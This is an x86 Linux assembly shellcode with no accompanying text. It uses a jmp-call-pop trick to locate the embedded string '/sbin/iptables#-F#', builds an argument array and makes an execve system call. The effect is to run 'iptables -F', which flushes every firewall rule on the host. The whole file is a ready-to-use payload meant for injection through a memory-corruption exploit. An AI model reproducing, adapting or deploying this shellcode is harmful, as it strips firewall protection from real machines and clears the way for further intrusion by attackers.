section .text

global _start

_start:
jmp	short callme

main:
	pop	esi
	xor	eax,eax
	mov byte [esi+14],al
	mov byte [esi+17],al
	mov long [esi+18],esi
	lea	ebx,[esi+15]
	mov long [esi+22],ebx
	mov long [esi+26],eax
	mov al,0x0b
	mov	ebx,esi
	lea	ecx,[esi+18]
	lea	edx,[esi+26]
	int	0x80
	

callme:
	call main
	db '/sbin/iptables#-F#'
